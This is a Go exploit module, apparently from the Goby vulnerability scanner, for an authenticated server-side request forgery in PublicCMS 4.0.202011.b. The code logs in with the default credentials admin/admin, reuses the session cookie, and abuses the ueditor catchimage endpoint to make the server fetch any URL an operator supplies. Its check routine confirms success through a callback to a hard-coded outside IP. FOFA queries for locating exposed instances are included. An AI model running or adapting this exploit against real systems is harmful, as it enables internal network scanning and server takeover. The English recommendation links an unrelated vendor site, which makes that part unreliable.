package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "PublicCMS 202011 Auth SSRF",
    "Description": "<p>PublicCMS is an open source content management system (CMS) written in Java language.</p><p>An SSRF vulnerability was discovered in the version of PublicCMS-V4.0.202011.b. Attackers can use the vulnerability to scan the internal network open hosts and ports, use the internal network vulnerabilities to attack redis, struts2 and other applications, and further gain control of the server system.</p>",
    "Impact": "PublicCMS 202011 Auth SSRF",
    "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"https://www.discuz.net/\">https://www.discuz.net/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "PublicCMS",
    "VulType": [
        "Server-Side Request Forgery"
    ],
    "Tags": [
        "Server-Side Request Forgery"
    ],
    "Translation": {
        "CN": {
            "Name": "PublicCMS内容管理系统 4.0.202011.b 版本后台 SSRF 漏洞",
            "Description": "<p>PublicCMS是一套使用Java语言编写的开源内容管理系统（CMS）。</p><p>PublicCMS-V4.0.202011.b的版本中发现了一个SSRF漏洞，攻击者可以利用该漏洞扫描内网开放主机和端口，利用内网漏洞攻击redis、struts2等应用，进一步获取对服务器系统的控制权。</p>",
            "Impact": "<p>PublicCMS-V4.0.202011.b的版本中发现了一个SSRF漏洞，攻击者可以利用该漏洞扫描内网开放主机和端口，利用内网漏洞攻击redis、struts2等应用，进一步获取对服务器系统的控制权。</p>",
            "Recommendation": "<p>厂商暂未提供修复方案，请关注厂商网站及时更新: <a href=\"https://github.com/sanluan/PublicCMS\">https://github.com/sanluan/PublicCMS</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "PublicCMS",
            "VulType": [
                "服务器端请求伪造"
            ],
            "Tags": [
                "服务器端请求伪造"
            ]
        },
        "EN": {
            "Name": "PublicCMS 202011 Auth SSRF",
            "Description": "<p>PublicCMS is an open source content management system (CMS) written in Java language.</p><p>An SSRF vulnerability was discovered in the version of PublicCMS-V4.0.202011.b. Attackers can use the vulnerability to scan the internal network open hosts and ports, use the internal network vulnerabilities to attack redis, struts2 and other applications, and further gain control of the server system.</p>",
            "Impact": "PublicCMS 202011 Auth SSRF",
            "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"https://www.discuz.net/\">https://www.discuz.net/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Product": "PublicCMS",
            "VulType": [
                "Server-Side Request Forgery"
            ],
            "Tags": [
                "Server-Side Request Forgery"
            ]
        }
    },
    "FofaQuery": "((title=\"publiccms\" && (title=\"Welcome to PublicCMS!\" || body=\"<h1>欢迎使用 PublicCMS</h1>\")) || body=\"/publiccms/webfile/\" || body=\"content=\\\"PublicCMS\" || title=\"Welcome to PublicCMS!\" || header=\"X-Powered-Publiccms:\" || banner=\"X-Powered-Publiccms:\") || body=\"/webfile/\"",
    "GobyQuery": "((title=\"publiccms\" && (title=\"Welcome to PublicCMS!\" || body=\"<h1>欢迎使用 PublicCMS</h1>\")) || body=\"/publiccms/webfile/\" || body=\"content=\\\"PublicCMS\" || title=\"Welcome to PublicCMS!\" || header=\"X-Powered-Publiccms:\" || banner=\"X-Powered-Publiccms:\") || body=\"/webfile/\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://github.com/sanluan/PublicCMS",
    "DisclosureDate": "2021-05-23",
    "References": [
        "https://github.com/sanluan/PublicCMS/issues/51"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "5.6",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "filepath",
            "type": "createSelect",
            "value": "http://www.baidu.com",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [
            "PublicCMS"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10229"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			foeye := "165.22.59.16"
			aaa := goutils.RandomHexString(16)
			checkUrl := foeye + "/api/v1/poc_scan/" + aaa
			uri1 := "/admin/login.do"
			cfg1 := httpclient.NewPostRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg1.Data = `username=admin&password=admin&returnUrl=%2Fadmin%2F`
			if resp1, err := httpclient.DoHttpRequest(u, cfg1); err == nil {
				if resp1.StatusCode == 302 {
					JSESSIONIDFind := regexp.MustCompile("Set-Cookie: JSESSIONID=(.*?);").FindStringSubmatch(resp1.HeaderString.String())
					uri2 := "/admin/ueditor?action=catchimage&file%5b%5d=http://" + checkUrl
					cfg2 := httpclient.NewGetRequestConfig(uri2)
					cfg2.VerifyTls = false
					cfg2.Header.Store("Cookie", "JSESSIONID="+JSESSIONIDFind[1])
					httpclient.DoHttpRequest(u, cfg2)
					u2 := httpclient.NewFixUrl(foeye + ":80")
					cfg3 := httpclient.NewGetRequestConfig("/api/v1/poc_scan/get_result?filter=" + aaa)
					if resp3, err := httpclient.DoHttpRequest(u2, cfg3); err == nil {
						return resp3.StatusCode == 200 && strings.Contains(resp3.Utf8Html, "ok") && strings.Contains(resp3.Utf8Html, "time")
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["filepath"].(string)
			uri1 := "/admin/login.do"
			cfg1 := httpclient.NewPostRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg1.Data = `username=admin&password=admin&returnUrl=%2Fadmin%2F`
			if resp1, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil {
				if resp1.StatusCode == 302 {
					JSESSIONIDFind := regexp.MustCompile("Set-Cookie: JSESSIONID=(.*?);").FindStringSubmatch(resp1.HeaderString.String())
					uri2 := "/admin/ueditor?action=catchimage&file%5b%5d=" + cmd
					cfg2 := httpclient.NewGetRequestConfig(uri2)
					cfg2.VerifyTls = false
					cfg2.Header.Store("Cookie", "JSESSIONID="+JSESSIONIDFind[1])
					if resp2, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil {
						if resp2.StatusCode == 200 {
							expResult.Output = resp2.RawBody
							expResult.Success = true
						}
					}
				}
			}
			return expResult
		},
	))
}
